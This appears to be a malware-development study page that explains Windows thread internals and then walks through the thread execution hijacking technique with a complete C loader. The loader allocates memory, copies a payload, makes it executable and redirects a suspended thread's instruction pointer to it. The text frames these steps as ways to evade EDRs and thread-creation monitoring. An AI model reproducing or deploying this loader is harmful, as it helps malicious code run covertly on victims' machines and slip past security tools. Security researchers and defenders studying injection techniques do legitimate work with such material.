# https://www.udayxd.xyz/notes/maldev/thread-hijacking-local-thread-creation

For the complete documentation index, see [llms.txt](https://www.udayxd.xyz/llms.txt). This page is also available as [Markdown](https://www.udayxd.xyz/notes/maldev/thread-hijacking-local-thread-creation.md).

#### What is a Thread?[Direct link to heading](https://www.udayxd.xyz/notes/maldev/thread-hijacking-local-thread-creation\#what-is-a-thread)

A thread is the **actual entity that executes code** inside a process. The Kernel decides which thread runs, when it runs, and on which CPU core it runs this is called **scheduling**. The most important thing to remember is that a process is just a container, threads are the actual workers doing all the real work inside that container.

* * *

#### Thread and CPU Cores[Direct link to heading](https://www.udayxd.xyz/notes/maldev/thread-hijacking-local-thread-creation\#thread-and-cpu-cores)

When a thread is in **Running state** it is actively executing on a **logical CPU core**. Each core can only run one thread at a time. Windows switches threads on and off cores so fast that it feels like everything is running simultaneously but in reality threads are taking turns extremely rapidly.

**Key Points:**

- One thread = one logical CPU core at any given moment

- Kernel decides which thread gets which core via scheduling

- Threads take turns on cores so fast it feels parallel


* * *

#### CPU Registers and Context Switch[Direct link to heading](https://www.udayxd.xyz/notes/maldev/thread-hijacking-local-thread-creation\#cpu-registers-and-context-switch)

Every thread stores its **current working state** in CPU registers while it is running. Registers are basically the CPU's scratch pad current calculations, current instruction pointer, everything lives there while the thread is active.

When a thread gets paused Windows saves every single register value this snapshot is called the **Thread Context**. When the thread gets CPU time again Windows loads back all those saved registers and the thread resumes **exactly from where it left off**.

> Analogy Think of it like a **bookmark in a book**. When you get interrupted you place a bookmark at the exact line. When you come back you open exactly at that line and continue. CPU registers are that bookmark for threads.

**What gets saved in Thread Context:**

- **Instruction Pointer** exactly which line of code was running

- **Stack Pointer** where in the stack it was

- **General Purpose Registers** all values being calculated

- **CPU Flags** current CPU state


* * *

#### Current Access Mode[Direct link to heading](https://www.udayxd.xyz/notes/maldev/thread-hijacking-local-thread-creation\#current-access-mode)

At any moment a thread is operating in either **User Mode or Kernel Mode**:

- **User Mode** normal code running, limited access, cannot touch hardware directly

- **Kernel Mode** when thread makes a syscall it temporarily switches to kernel mode with full system access

- Same thread can switch between both modes depending on what it is doing


* * *

#### Two Stacks[Direct link to heading](https://www.udayxd.xyz/notes/maldev/thread-hijacking-local-thread-creation\#two-stacks)

Every thread maintains **two completely separate stacks**:

- **User Mode Stack** used when normal user code is running, stores function calls and local variables

- **Kernel Mode Stack** used when thread enters kernel via syscall


These are kept separate as a hard security boundary if both shared the same stack, user code could read kernel data which would be a massive security hole.

* * *

#### Thread Local Storage (TLS)[Direct link to heading](https://www.udayxd.xyz/notes/maldev/thread-hijacking-local-thread-creation\#thread-local-storage-tls)

All threads inside a process share the same process memory. But sometimes a thread needs **private data that belongs only to it** and no other thread should access. TLS is that private locker each thread gets its own TLS where it can store data completely isolated from other threads.

**Example** each thread stores its own error codes in TLS so other threads cannot accidentally overwrite them.

* * *

#### Security Token[Direct link to heading](https://www.udayxd.xyz/notes/maldev/thread-hijacking-local-thread-creation\#security-token)

By default every thread **inherits and uses the parent process access token** which defines its privilege level. However a thread can optionally be given its own separate token.

> This is the foundation of **Token Impersonation** give a thread someone else's higher privileged token temporarily and it operates with their privileges instead

* * *

#### Optional Message Queue[Direct link to heading](https://www.udayxd.xyz/notes/maldev/thread-hijacking-local-thread-creation\#optional-message-queue)

When a thread creates a **GUI element** like a window or button, Windows automatically creates a **message queue** for that thread. User actions like clicks and keyboard presses go into this queue and the thread processes them one by one. Non-GUI threads don't need this so it is optional.

* * *

#### Thread States[Direct link to heading](https://www.udayxd.xyz/notes/maldev/thread-hijacking-local-thread-creation\#thread-states)

A thread is always in one of three states:

State

What it means

**Running**

Thread is actively executing on a CPU logical core right now

**Ready**

Thread wants to run but no CPU core is free, waiting in queue

**Waiting**

Thread is waiting for something network reply, file read, timer does not need CPU right now

> Example if you have an **8 core CPU**, maximum 8 threads can be Running at the same time. Any extra threads sit in Ready state. Waiting threads are completely removed from CPU consideration until their wait is resolved this way CPU is never wasted on threads that have nothing to do.

### Thread Hijacking - Local Thread Creation[Direct link to heading](https://www.udayxd.xyz/notes/maldev/thread-hijacking-local-thread-creation\#thread-hijacking-local-thread-creation)

#### Introduction[Direct link to heading](https://www.udayxd.xyz/notes/maldev/thread-hijacking-local-thread-creation\#introduction)

[Thread Execution Hijacking](https://attack.mitre.org/techniques/T1055/003/)
is a technique that can execute a payload without the need of creating a
new thread. The way this technique works is by suspending the thread
and updating the register that points to the next instruction in memory
to point to the start of the payload. When the thread resumes execution,
the payload is executed.

#### Thread Context[Direct link to heading](https://www.udayxd.xyz/notes/maldev/thread-hijacking-local-thread-creation\#thread-context)

Before the technique can be explained, _thread context_ must
be understood. Every thread has a scheduling priority and maintains a
set of structures that the system saves to the thread's context. Thread
context includes all the information the thread needs to seamlessly
resume execution, including the thread's set of CPU registers and stack.

#### **CONTEXT structure**[Direct link to heading](https://www.udayxd.xyz/notes/maldev/thread-hijacking-local-thread-creation\#context-structure)

Contains processor-specific register data. The system uses **CONTEXT** structures to perform various internal operations.

Copy

```
typedef struct _CONTEXT {
  DWORD64 P1Home;
  DWORD64 P2Home;
  DWORD64 P3Home;
  DWORD64 P4Home;
  DWORD64 P5Home;
  DWORD64 P6Home;
  DWORD   ContextFlags;
  DWORD   MxCsr;
  WORD    SegCs;
  WORD    SegDs;
  WORD    SegEs;
  WORD    SegFs;
  WORD    SegGs;
  WORD    SegSs;
  DWORD   EFlags;
  DWORD64 Dr0;
  DWORD64 Dr1;
  DWORD64 Dr2;
  DWORD64 Dr3;
  DWORD64 Dr6;
  DWORD64 Dr7;
  DWORD64 Rax;
  DWORD64 Rcx;
  DWORD64 Rdx;
  DWORD64 Rbx;
  DWORD64 Rsp;
  DWORD64 Rbp;
  DWORD64 Rsi;
  DWORD64 Rdi;
  DWORD64 R8;
  DWORD64 R9;
  DWORD64 R10;
  DWORD64 R11;
  DWORD64 R12;
  DWORD64 R13;
  DWORD64 R14;
  DWORD64 R15;
  DWORD64 Rip;
  union {
    XMM_SAVE_AREA32 FltSave;
    NEON128         Q[16];
    ULONGLONG       D[32];
    struct {
      M128A Header[2];
      M128A Legacy[8];
      M128A Xmm0;
      M128A Xmm1;
      M128A Xmm2;
      M128A Xmm3;
      M128A Xmm4;
      M128A Xmm5;
      M128A Xmm6;
      M128A Xmm7;
      M128A Xmm8;
      M128A Xmm9;
      M128A Xmm10;
      M128A Xmm11;
      M128A Xmm12;
      M128A Xmm13;
      M128A Xmm14;
      M128A Xmm15;
    } DUMMYSTRUCTNAME;
    DWORD           S[32];
  } DUMMYUNIONNAME;
  M128A   VectorRegister[26];
  DWORD64 VectorControl;
  DWORD64 DebugControl;
  DWORD64 LastBranchToRip;
  DWORD64 LastBranchFromRip;
  DWORD64 LastExceptionToRip;
  DWORD64 LastExceptionFromRip;
} CONTEXT, *PCONTEXT;
```

Thread context includes all the information the thread needs to seamlessly resume execution, including the thread's set of CPU registers and stack.

#### Setting ContextFlags[Direct link to heading](https://www.udayxd.xyz/notes/maldev/thread-hijacking-local-thread-creation\#setting-contextflags)

As we can see `CONTEXT` is a massive structure. It does not just hold `RIP` and `RSP`. It holds every register group the CPU has:

Copy

```
General purpose registers  ->  RAX, RBX, RCX, RDX, RSI, RDI, R8-R15
Control registers          ->  RIP, RSP, RFLAGS, CS, SS
Floating point state       ->  the entire x87 FPU state
SSE/AVX registers          ->  XMM0-XMM15, YMM registers
Debug registers            ->  DR0-DR7
Segment registers          ->  GS, FS, ES, DS
```

Saving and restoring all of that on every call is expensive and wasteful. Most of the time you don't need the FPU state or the SSE registers. So Microsoft gave you a way to tell the kernel exactly which register groups you want. That is what `ContextFlags` is, a bitmask you set inside the `CONTEXT` structure before passing it to `GetThreadContext`.

This is why `lpContext` is marked as both **IN** and **OUT**. You pass it in with `ContextFlags` already set, the kernel reads that flag, fills only the registers you asked for, and passes it back out to you.

The available flags:

Copy

```
CONTEXT_CONTROL          // RIP, RSP, RFLAGS, CS, SS
CONTEXT_INTEGER          // RAX, RBX, RCX, RDX, RSI, RDI, R8-R15
CONTEXT_FLOATING_POINT   // XMM0-XMM15, x87 FPU state
CONTEXT_DEBUG_REGISTERS  // DR0-DR7
CONTEXT_FULL             // CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_FLOATING_POINT
CONTEXT_ALL              // everything including debug registers
```

For thread hijacking, `CONTEXT_CONTROL` is the minimum required. You only need `RIP` to redirect execution and `RSP` to know the stack is valid. Both live inside `CONTEXT_CONTROL`.

If `ContextFlags` is left at zero, the kernel reads it, sees "retrieve nothing," and returns an empty structure with all fields zero. You get no register data.

* * *

#### GetThreadContext[Direct link to heading](https://www.udayxd.xyz/notes/maldev/thread-hijacking-local-thread-creation\#getthreadcontext)

Copy

```
BOOL GetThreadContext(
  [in]      HANDLE    hThread,
  [in, out] LPCONTEXT lpContext
);
```

**What It Does**

Copy

```
CONTEXT ThreadCtx = {
    .ContextFlags = CONTEXT_CONTROL
};

GetThreadContext(hThread, &ThreadCtx);
```

Reads the saved CPU state of the target thread and populates the `CONTEXT` structure. The thread must be suspended before calling this. If the thread is actively running on a CPU its registers are physically inside the CPU, not saved anywhere the kernel can read them from.

**What Happens Inside the Kernel**

The syscall goes down to `NtGetContextThread` inside `ntoskrnl.exe`.

The kernel first calls `ObReferenceObjectByHandle` on `hThread`. This walks your process's `_EPROCESS.ObjectTable`, finds the `_HANDLE_TABLE_ENTRY` for that handle, checks the `GrantedAccessBits` field has `THREAD_GET_CONTEXT`, and returns a pointer to the `_ETHREAD` body.

`_ETHREAD` starts with `_KTHREAD` at offset zero. `_KTHREAD` holds a pointer to the thread's trap frame:

Copy

```
_KTHREAD
  +0x090 TrapFrame : Ptr64 _KTRAP_FRAME
```

`_KTRAP_FRAME` is where the CPU registers were saved the last time this thread transitioned from user mode to kernel mode. The kernel reads `ContextFlags` from your structure, then selectively copies the flagged register groups out of `_KTRAP_FRAME` into your `CONTEXT`:

Copy

```
_KTRAP_FRAME
  +0x180 Rip -> ctx.Rip (only if CONTEXT_CONTROL is set)
  +0x168 Rsp -> ctx.Rsp (only if CONTEXT_CONTROL is set)
  +0x138 Rax -> ctx.Rax (only if CONTEXT_INTEGER is set)
  +0x130 Rcx -> ctx.Rcx (only if CONTEXT_INTEGER is set)
```

Before writing into your buffer, the kernel calls `ProbeForWrite` to validate that `lpContext` is a real writable user-mode address. Then it copies the data across. Nothing in any `_EPROCESS` or `_ETHREAD` is modified during this call. It is a pure read.

* * *

#### SetThreadContext[Direct link to heading](https://www.udayxd.xyz/notes/maldev/thread-hijacking-local-thread-creation\#setthreadcontext)

Copy

```
BOOL SetThreadContext(
  [in] HANDLE        hThread,
  [in] const CONTEXT *lpContext
);
```

**What It Does**

Copy

```
ThreadCtx.Rip = (DWORD64)pAddress;

SetThreadContext(hThread, &ThreadCtx);
```

The reverse of `GetThreadContext`. Instead of reading the saved register state out of the kernel, it writes your modified `CONTEXT` values back into the thread's saved state. The thread must still be suspended. When it is resumed, the scheduler loads the trap frame back onto the CPU and the thread picks up from whatever `RIP` now says.

**What Happens Inside the Kernel**

The syscall goes to `NtSetContextThread`. The handle resolution is identical: `ObReferenceObjectByHandle` walks your handle table, checks `THREAD_SET_CONTEXT` access, returns the `_ETHREAD` pointer.

The kernel then calls `ProbeForRead` on your `lpContext` address to validate it is a readable user-mode address. It reads `ContextFlags` from your structure, then writes only the flagged register groups into the corresponding fields of `_KTRAP_FRAME`:

Copy

```
ctx.Rip -> _KTRAP_FRAME +0x180 Rip (if CONTEXT_CONTROL is set)
ctx.Rsp -> _KTRAP_FRAME +0x168 Rsp (if CONTEXT_CONTROL is set)
```

This is the actual mutation. The thread's saved `RIP` inside `_KTRAP_FRAME` is now your shellcode address. When `ResumeThread` is called, `SuspendCount` in `_KTHREAD` drops to zero, the scheduler picks the thread up, `KiRestoreContext` loads `_KTRAP_FRAME` back onto the physical CPU registers, and the thread starts executing from your address.

* * *

#### Thread Hijacking vs Thread Creation[Direct link to heading](https://www.udayxd.xyz/notes/maldev/thread-hijacking-local-thread-creation\#thread-hijacking-vs-thread-creation)

The question is why hijack an existing thread instead of just calling `CreateThread` with your payload address.

`CreateThread` takes `lpStartAddress` as its third parameter. That address must point to where the new thread begins executing. If you point it at your payload, that address is directly visible. Any tool watching thread creation events sees a new `_ETHREAD` with a start address pointing at an unusual memory region. The payload is immediately exposed.

Thread hijacking creates no new `_ETHREAD`. No new thread appears in the process thread list. The thread that runs your shellcode is the same thread that was already there. Its original start address still points at the benign function it was created with. From the outside, nothing looks new.

* * *

#### Code Walkthrough[Direct link to heading](https://www.udayxd.xyz/notes/maldev/thread-hijacking-local-thread-creation\#code-walkthrough)

**RunViaClassicThreadHijacking**

Copy

```
BOOL RunViaClassicThreadHijacking(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {

    PVOID    pAddress        = NULL;
    DWORD    dwOldProtection = NULL;
    CONTEXT  ThreadCtx       = {
        .ContextFlags = CONTEXT_CONTROL
    };
```

`ContextFlags` is set at initialization with a designated initializer. This guarantees it is set before the structure is passed anywhere. `CONTEXT_CONTROL` is the minimum needed, it gives access to `RIP` and `RSP`.

Copy

```
    pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pAddress == NULL) {
        printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
```

Memory is allocated in the local process for the payload. `PAGE_READWRITE` is used here intentionally, not `PAGE_EXECUTE_READWRITE`. Writing executable memory directly is a loud signal to EDRs. The plan is to write first, then change protection.

Copy

```
    memcpy(pAddress, pPayload, sPayloadSize);
```

Payload bytes are copied into the allocated region. At this point the memory is writable but not executable.

Copy

```
    if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
```

Protection is changed to executable after the write is done. `dwOldProtection` receives the previous protection flags. Splitting the write and the permission change is a common pattern to reduce the time a writable-and-executable region exists.

Copy

```
    if (!GetThreadContext(hThread, &ThreadCtx)) {
        printf("[!] GetThreadContext Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
```

The thread's current saved register state is pulled into `ThreadCtx`. The thread must already be suspended at this point. If it is not suspended this call will fail or return inconsistent data because the registers are live on a CPU.

Copy

```
    ThreadCtx.Rip = pAddress;
```

The only modification made to the context. `Rip` is updated to point at the start of the payload. Every other register stays exactly as it was read from the thread. The thread has no idea this happened.

Copy

```
    if (!SetThreadContext(hThread, &ThreadCtx)) {
        printf("[!] SetThreadContext Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    return TRUE;
}
```

The modified context is written back. The kernel takes `ThreadCtx.Rip` and writes it into `_KTRAP_FRAME +0x180`. The function returns. Nothing has executed yet. The thread is still suspended. Execution only begins when `ResumeThread` is called in the main function.

* * *

**Main Function**

Copy

```
DWORD WINAPI DummyFunction(LPVOID lpParam) {    while (TRUE) {        Sleep(1000);    }    return 0;}

int main() {

    HANDLE hThread = NULL;

    hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)&DummyFunction, NULL, CREATE_SUSPENDED, NULL);
    if (hThread == NULL) {
        printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
```

A sacrificial thread is created pointing at `DummyFunction`, a benign function that does nothing meaningful. `CREATE_SUSPENDED` puts the thread into suspended state immediately at creation without it executing a single instruction. `SuspendCount` in `_KTHREAD` starts at one so the scheduler ignores it. The thread's start address in `_ETHREAD` points at `DummyFunction` and stays that way permanently, even after hijacking. That is the point. From any external observer the thread looks like it was always meant to run `DummyFunction`.

Copy

```
    if (!RunViaClassicThreadHijacking(hThread, Payload, sizeof(Payload))) {
        return -1;
    }
```

The hijack runs. Memory is allocated, payload is copied in, protection is changed, `RIP` is redirected. The thread is still suspended, nothing has run.

Copy

```
    ResumeThread(hThread);
```

`SuspendCount` in `_KTHREAD` drops to zero. The scheduler is now allowed to run this thread. When it gets CPU time, `KiRestoreContext` loads the `_KTRAP_FRAME` back onto the physical CPU registers including the modified `RIP`. The thread starts executing at the payload's base address.

Copy

```
    printf("[#] Press <Enter> To Quit ... ");
    getchar();

    return 0;
}
```

`getchar` keeps the main thread alive while the payload runs in the hijacked thread. Without this the process would exit before the payload finishes.

[PreviousAPC Injection and Early Bird APC Injection](https://www.udayxd.xyz/notes/maldev/apc-injection-and-early-bird-apc-injection) [NextWindows Versions](https://www.udayxd.xyz/notes/windows/windows-versions)

Last updated 26 days ago